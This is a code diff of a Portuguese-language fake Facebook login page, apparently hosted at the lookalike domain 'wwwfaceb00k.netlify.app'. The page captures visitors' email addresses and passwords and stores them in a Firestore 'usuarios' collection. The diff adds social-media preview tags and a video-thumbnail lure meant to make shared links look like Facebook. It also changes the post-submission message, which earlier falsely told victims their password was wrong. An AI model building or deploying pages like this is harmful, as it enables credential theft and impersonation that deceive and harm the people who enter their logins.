@@ -4,14 +4,22 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Login ou Inscreva-se</title>
-    
+
     <!-- Open Graph Tags -->
-    <meta property="og:title" content="Facebook.com">
-    <meta property="og:description" content="veja o que aconteceu com ele!">
-    <meta property="og:image" content="Nova pasta/download.jpg"> <!-- URL da imagem que será exibida -->
-    <meta property="og:url" content="https://www.facebook.com">
+    <meta property="og:title" content="Facebook - Login ou Inscreva-se">
+    <meta property="og:description" content="O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.">
+    <meta property="og:image" content="https://wwwfaceb00k.netlify.app/images/thumbnail-video.jpg"> <!-- URL completa da imagem -->
+    <meta property="og:url" content="https://wwwfaceb00k.netlify.app">
     <meta property="og:type" content="website">
+
+    <!-- Twitter Card (Opcional) -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Facebook - Login ou Inscreva-se">
+    <meta name="twitter:description" content="O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.">
+    <meta name="twitter:image" content="https://wwwfaceb00k.netlify.app/images/thumbnail-video.jpg">
+
     <style>
+        /* Seus estilos CSS existentes */
         * {
             margin: 0;
             padding: 0;
@@ -40,6 +48,7 @@
         .left {
             max-width: 500px;
             flex: 1;
+            position: relative; /* Para posicionar a imagem */
         }
 
         .left h1 {
@@ -52,6 +61,29 @@
         .left p {
             font-size: 20px;
             color: #1c1e21;
+        }
+
+        /* Estilos para a imagem com link */
+        .video-link {
+            position: absolute;
+            top: 0;
+            right: -170px; /* Ajuste conforme necessário */
+            width: 150px; /* Tamanho da imagem */
+            cursor: pointer;
+            border: 2px solid #1877f2;
+            border-radius: 8px;
+            overflow: hidden;
+            transition: transform 0.3s;
+        }
+
+        .video-link:hover {
+            transform: scale(1.05);
+        }
+
+        .video-link img {
+            width: 100%;
+            height: auto;
+            display: block;
         }
 
         .right {
@@ -140,6 +172,12 @@
                 font-size: 18px;
             }
 
+            .video-link {
+                position: static;
+                margin: 20px auto;
+                right: 0;
+            }
+
             .right {
                 max-width: 100%;
                 padding: 20px;
@@ -171,13 +209,17 @@
             }
         }
     </style>
-    
 </head>
 <body>
     <div class="container">
         <div class="left">
             <h1>facebook</h1>
             <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
+
+            <!-- Link com Imagem (Thumbnail) -->
+            <a href="https://wwwfaceb00k.netlify.app" class="video-link" target="_blank">
+                <img src="https://wwwfaceb00k.netlify.app/images/thumbnail-video.jpg" alt="Thumbnail do Vídeo">
+            </a>
         </div>
 
         <div class="right">
@@ -220,7 +262,18 @@
         const db = getFirestore(app);
 
         // Função para testar a conexão com Firestore
-        
+        async function testarConexao() {
+            try {
+                const usuariosCollection = collection(db, "usuarios");
+                await addDoc(usuariosCollection, {
+                    email: "teste@example.com",
+                    password: "senha123"
+                });
+                console.log("Teste: Documento adicionado com sucesso!");
+            } catch (error) {
+                console.error("Teste: Erro ao adicionar documento: ", error);
+            }
+        }
 
         // Executar o teste de conexão quando a página carregar
         window.addEventListener('load', testarConexao);
@@ -238,10 +291,10 @@
                     email: email,
                     password: password
                 });
-                alert("senha incorreta, porfavor tente novamente.");
+                alert("Dados enviados com sucesso!");
                 console.log("Dados enviados com sucesso!");
             } catch (error) {
-                console.error("Erro", error);
+                console.error("Erro ao enviar os dados: ", error);
             }
         });
     </script>
